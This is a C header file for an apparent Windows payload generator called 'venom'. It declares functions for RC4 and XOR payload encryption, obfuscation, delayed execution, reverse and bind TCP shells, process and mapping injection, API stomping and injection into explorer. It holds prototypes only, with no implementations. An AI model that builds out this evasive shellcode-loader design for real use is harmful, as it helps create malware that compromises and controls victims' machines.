#pragma once
#include <stdio.h>
#include <windows.h>
#include <time.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <io.h> 
#include <direct.h>
#include <wchar.h>
#include <locale.h>
#pragma execution_character_set("utf-8")

#define _CRT_SECURE_NO_WARNINGS
#define _MAX_DRIVE 3  
#define _MAX_DIR 256
#define _MAX_FNAME 256
#define _MAX_EXT 256
#define BUFFER_SIZE 20024 
typedef unsigned char* PBYTE;

//===================================================================================================//
// venom.c
//===================================================================================================//
int is_valid_ip(const char* ip);
int is_valid_port(const char* port);
int is_valid_format(const char* format);
VOID help(char* arg0);
VOID print_usage();

//===================================================================================================//
// crypt.c
//===================================================================================================//
BOOL OpenPayloadFile(const char* fileName, PBYTE* ppPayloadData, PDWORD pPayloadSize);
VOID creatHexArray(char* output, PBYTE data, DWORD size, size_t output_size);
//===================================================================================================//
// crypt _rc4
//===================================================================================================//
BOOL Rc4Encrypt(IN PBYTE pRc4Key, IN DWORD dwRc4KeySize, IN OUT PBYTE pPayloadData, IN DWORD sPayloadSize);
VOID RC4GenerateProtectedKey(IN BYTE HintByte, IN SIZE_T sKey, OUT PBYTE* ppOriginalKey, OUT PBYTE* ppProtectedKey);
//===================================================================================================//
// crypt _xor
//===================================================================================================//
VOID obf_HexArray(char* output, PBYTE data, DWORD size, size_t output_size);
VOID xor (char* data, size_t data_len, const char* key, size_t key_len);
char* generate_random_string_key();
char* obf(const char* text, const char* key);

//================================================================================================================================================================//
// generator.c 
//================================================================================================================================================================//
int generate_source(const char* payload);
int generate_bat(const char* format, int simple_flag);
int generate_output(const char* format, const char* buffer, int simple_flag);
int create_batch_file(const char* filename);
int check_mingw_installed(IN char* argv_0);

//================================================================================================================================================================//
// obfuscated code with deley  
//================================================================================================================================================================//
void obf_deley_1_tcp_3_time(char* payload, size_t size, const char* ip, const char* port_str);
void obf_deley_2_tcp__time_dll(char* payload, size_t size, const char* ip, const char* port_str);
void obf_deley_2_tcp__time(char* payload, size_t size, const char* ip, const char* port_str);
void obf_deley_4_mapping_injection(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
void obf_deley_4_mapping_injection_dll(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
void obf_deley_5_process_injection(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
void obf_deley_5_process_injection_dll(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
void obf_deley_6_API_stompping(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
void obf_deley_7_inject_explorar(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint, const char* Rprocess);
void obf_deley_7_inject_explorar_DLL(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint, const char* Rprocess);

 

//================================================================================================================================================================//
// obfuscated code 
//================================================================================================================================================================//
void obf_1_tcp_3_time(char* payload, size_t size, const char* ip, const char* port_str);
void obf_2_tcp__time_dll(char* payload, size_t size, const char* ip, const char* port_str);
void obf_2_tcp__time(char* payload, size_t size, const char* ip, const char* port_str);
void obf_3_bind_tcp(char* payload, size_t size, const char* port_str);
void obf_3_bind_tcp_dll(char* payload, size_t size, const char* port_str);
void obf_4_mapping_injection(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
void obf_4_mapping_injection_dll(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
void obf_5_process_injection(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
void obf_5_process_injection_dll(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
void obf_6_API_stompping(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
void obf_7_inject_explorar(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint, const char* Rprocess);
void obf_7_inject_explorar_DLL(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint, const char* Rprocess);






//================================================================================================================================================================//
// _source _code with deley 
//================================================================================================================================================================//
void deley_source_1_tcp_3_time(char* payload, size_t size, const char* ip, const char* port_str);
void deley_source_2_tcp__time(char* payload, size_t size, const char* ip, const char* port_str);
void deley_source_2_tcp__time_dll(char* payload, size_t size, const char* ip, const char* port_str);
VOID deley_source_4_mapping_injection(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
VOID deley_source_4_mapping_injection_dll(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
VOID deley_source_5_process_injection(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
VOID deley_source_5_process_injection_dll(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
VOID deley_source_6_API_stompping(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
VOID deley_source_7_inject_explorar(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint, const char* Rprocess);
VOID deley_source_7_inject_explorar_DLL(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint, const char* Rprocess);




//================================================================================================================================================================//
// _source _code  
//================================================================================================================================================================//
void _source_1_tcp_3_time(char* payload, size_t size, const char* ip, const char* port_str);
void _source_2_tcp__time(char* payload, size_t size, const char* ip, const char* port_str);
void _source_2_tcp__time_dll(char* payload, size_t size, const char* ip, const char* port_str);
void _source_3_bind_tcp(char* payload, size_t size, const char* port_str);
void _source_3_bind_tcp_dll(char* payload, size_t size, const char* port_str);
VOID _source_4_mapping_injection(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
VOID _source_4_mapping_injection_dll(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
VOID _source_5_process_injection(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
VOID _source_5_process_injection_dll(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
VOID _source_6_API_stompping(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint);
VOID _source_7_inject_explorar(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint, const char* Rprocess);
VOID _source_7_inject_explorar_DLL(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint, const char* Rprocess);






